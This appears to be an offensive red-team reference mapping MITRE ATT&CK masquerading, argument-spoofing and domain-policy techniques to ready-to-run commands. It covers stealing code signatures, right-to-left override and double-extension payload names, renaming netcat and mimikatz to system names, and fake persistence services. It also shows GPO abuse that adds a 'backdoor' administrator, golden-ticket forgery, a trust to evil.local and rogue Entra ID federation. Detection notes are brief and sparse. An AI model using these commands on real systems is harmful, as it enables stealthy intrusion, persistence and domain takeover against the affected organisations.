# Advanced Masquerading & Domain Policy Modification Reference
# MITRE ATT&CK: T1036, T1484, T1564.010

> **Context:** Techniques for disguising malicious artifacts as legitimate, spoofing process
> attributes, and modifying domain policies for persistence and privilege escalation.

---

## T1036 — Masquerading (Advanced Sub-Techniques)

### T1036.001 — Invalid Code Signature

**Concept:** Copy the Authenticode signature from a legitimate signed binary onto a malicious
one. The signature will be *invalid* but many tools only check for *presence* of a signature.

```bash
# Using SigThief (https://github.com/secretsquirrel/SigThief)
python3 sigthief.py -i C:\Windows\System32\notepad.exe -t payload.exe -o signed_payload.exe

# Verify (will show signature exists but is invalid)
sigcheck -a signed_payload.exe
# Some AV/EDR give signed binaries a higher trust score regardless of validity
```

**Why it works:** Many security products check certificate *presence* not *validity* in their
initial triage. Signature presence alone can bump trust score past detection thresholds.

### T1036.002 — Right-to-Left Override (RTLO)

**Concept:** Unicode character U+202E reverses text display direction. Use to make `.scr`
or `.exe` files appear as `.docx`, `.pdf`, etc.

```bash
# Create filename with RTLO character
# Real name: invoice[U+202E]xcod.scr
# Displays as: invoicercs.docx
mv payload.scr $'invoice\xe2\x80\xaexcod.scr'

# Python helper
import os
rtlo = '\u202e'
os.rename('payload.scr', f'invoice{rtlo}xcod.scr')
```

**Windows shortcut variant:** Create .lnk with RTLO in the name, pointing to the real payload.

> **Detection:** Look for U+202E (0xE2 0x80 0xAE) in filenames. YARA rule:
> `rule RTLO { strings: $rtlo = { E2 80 AE } condition: $rtlo in (0..256) }`

### T1036.003 — Rename System Utilities

```bash
# Linux — rename netcat to look like a system service
cp /usr/bin/nc /tmp/svchost
cp /usr/bin/ncat /var/tmp/kworker
cp /usr/bin/curl /tmp/systemd-helper
chmod +x /tmp/svchost

# Windows — rename hacking tools to blend in
copy C:\tools\nc.exe C:\Windows\Temp\svchost.exe
copy C:\tools\mimikatz.exe C:\Windows\Temp\lsass_helper.exe
rename C:\tools\chisel.exe C:\Windows\Temp\RuntimeBroker.exe
```

**Common legitimate names to mimic:**
- Windows: `svchost.exe`, `RuntimeBroker.exe`, `conhost.exe`, `dllhost.exe`, `taskhostw.exe`
- Linux: `kworker`, `systemd-*`, `crond`, `syslogd`, `rsyslogd`, `dbus-daemon`

### T1036.004 — Masquerade Task or Service

```powershell
# Windows — create service with trusted-sounding name
New-Service -Name "WinDefendUpdate" -BinaryPathName "C:\Windows\Temp\payload.exe" -DisplayName "Windows Defender Update Service" -StartupType Automatic

sc create "gpsvc_helper" binPath= "C:\Windows\Temp\beacon.exe" DisplayName= "Group Policy Client Helper"

# Linux — create systemd service mimicking legitimate service
cat > /etc/systemd/system/systemd-resolved-helper.service << 'EOF'
[Unit]
Description=Network Name Resolution Helper
After=network.target

[Service]
ExecStart=/var/tmp/.cache/resolved-helper
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable systemd-resolved-helper.service
```

### T1036.005 — Match Legitimate Name or Location

**Key directories for blending in:**
```
# Windows trusted paths
C:\Windows\System32\
C:\Windows\Temp\
C:\Program Files\Common Files\
C:\ProgramData\Microsoft\
C:\Users\<user>\AppData\Local\Microsoft\

# Linux trusted paths
/usr/lib/
/usr/libexec/
/var/lib/
/opt/
/usr/local/sbin/
```

```bash
# Place payload in expected location with expected name
cp payload /usr/lib/x86_64-linux-gnu/libpthread-helper.so
cp beacon /usr/libexec/postfix/cleanup-helper
```

### T1036.007 — Double File Extension

```bash
# Exploit Windows hiding known extensions
# "report.pdf.exe" shows as "report.pdf" when extensions hidden (default)
cp payload.exe "report.pdf.exe"
cp payload.exe "invoice_2024.docx.exe"
cp payload.scr "meeting_notes.xlsx.scr"

# Add matching icon resource during compilation to complete the disguise
# Use Resource Hacker or rc compiler to embed PDF/Word icon
```

### T1036.009 — Break Process Tree

**Concept:** Break parent-child process relationships to evade detection rules that monitor
for suspicious process chains (e.g., Word.exe → cmd.exe → powershell.exe).

```bash
# Linux — setsid creates new session, breaks parent relationship
setsid /tmp/payload &
# Or double-fork
( ( /tmp/payload & ) & )
# nohup + disown
nohup /tmp/payload &>/dev/null & disown
```

```powershell
# Windows — WMI spawns process under WmiPrvSE.exe, not the caller
wmic process call create "C:\Windows\Temp\payload.exe"
# PowerShell equivalent
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "C:\Windows\Temp\payload.exe"

# COM object method — spawns under svchost.exe
$scheduler = New-Object -ComObject Schedule.Service
# ... create scheduled task that runs immediately and deletes itself

# Parent PID spoofing (requires CreateProcess with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)
# ppid-spoof tools: SelectMyParent, PPID-Spoof.ps1
```

---

## T1564.010 — Process Argument Spoofing

**Concept:** Start process with benign arguments, then overwrite the PEB command line and/or
argv[0] in memory so monitoring tools see fake arguments.

```c
// Linux — overwrite argv[0] after launch
#include <string.h>
#include <sys/prctl.h>
int main(int argc, char *argv[]) {
    // Change process name in /proc/self/status
    prctl(PR_SET_NAME, "syslogd", 0, 0, 0);
    // Overwrite argv[0] visible in /proc/self/cmdline
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], "[kworker/0:1]");
    // ... malicious activity
}
```

```powershell
# Windows PEB command line spoofing
# 1. Create process in SUSPENDED state with fake args
# 2. Read PEB → ProcessParameters → CommandLine
# 3. Overwrite CommandLine buffer with real args
# 4. Resume thread
# Tools: argue.exe, SyscallPack, custom C# with NtQueryInformationProcess
```

---

## T1484 — Domain or Tenant Policy Modification

### T1484.001 — Group Policy Objects (GPO) Modification

**Concept:** Modify existing GPOs to push malicious configurations to all domain computers —
scheduled tasks, scripts, registry changes. Highly effective for domain-wide persistence.

```powershell
# Enumerate GPOs and permissions
Get-GPO -All | Select DisplayName, Id
Get-GPOPermission -Name "Default Domain Policy" -All

# SharpGPOAbuse — add immediate scheduled task to existing GPO
SharpGPOAbuse.exe --AddComputerTask --TaskName "WindowsUpdate" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c C:\Windows\Temp\beacon.exe" --GPOName "Default Domain Policy"

# PowerShell — modify GPO to add startup script
New-GPLink -Name "Default Domain Policy" -Target "OU=Workstations,DC=corp,DC=local"

# pyGPOAbuse (Python, from Kali)
python3 pygpoabuse.py corp.local/admin:'Password123' -gpo-id "6AC1786C-016F-11D2-945F-00C04FB984F9" -command "cmd /c net user backdoor P@ss123 /add && net localgroup Administrators backdoor /add"
```

> **⚠️ SAFETY:** GPO changes propagate to ALL machines in scope. Use targeted OUs, not
> domain-wide GPOs, in lab environments. Changes take effect at next gpupdate cycle (~90 min)
> or force with `gpupdate /force` on individual targets.

**Detection:** Event IDs 5136/5137 (Directory Service Changes), GPO version number changes,
`\\SYSVOL` modifications.

### T1484.002 — Domain Trust Modification

**Concept:** Create or modify Active Directory trust relationships to allow cross-domain
access or forge authentication tokens across trust boundaries.

```powershell
# Enumerate existing trusts
Get-ADTrust -Filter *
nltest /domain_trusts /all_trusts

# Create new forest trust (requires Enterprise Admin)
netdom trust corp.local /d:evil.local /add /realm /passwordt:TrustP@ss

# Abuse existing trust — SID History injection
# Forge inter-realm TGT with SID from trusted domain
mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:S-1-5-21-CHILD /krbtgt:CHILD_KRBTGT_HASH /sids:S-1-5-21-PARENT-519 /ptt

# Azure AD / Entra ID — add federated identity provider
# Allows authentication as any tenant user via adversary-controlled IdP
# Tool: AADInternals
Install-Module AADInternals
Set-AADIntDomainAuthentication -DomainName corp.onmicrosoft.com -Authentication Federated -FederationBrandName "Corp Login"
```

**Detection:** Event ID 4706 (new trust created), Event ID 4707 (trust removed),
Azure AD audit logs for federation changes, Directory Service Changes events.

---

## Quick Reference — Common Masquerading Combos

| Scenario | Techniques Combined | Example |
|----------|-------------------|---------|
| Phishing payload | T1036.007 + T1036.002 | `report.pdf.exe` with RTLO |
| Persistence binary | T1036.005 + T1036.003 | Renamed nc in System32 |
| Service backdoor | T1036.004 + T1036.009 | Fake service + tree break |
| Domain takeover | T1484.001 + T1036.004 | GPO push + masked service |
| Stealthy beacon | T1036.005 + T1564.010 | Trusted path + arg spoof |
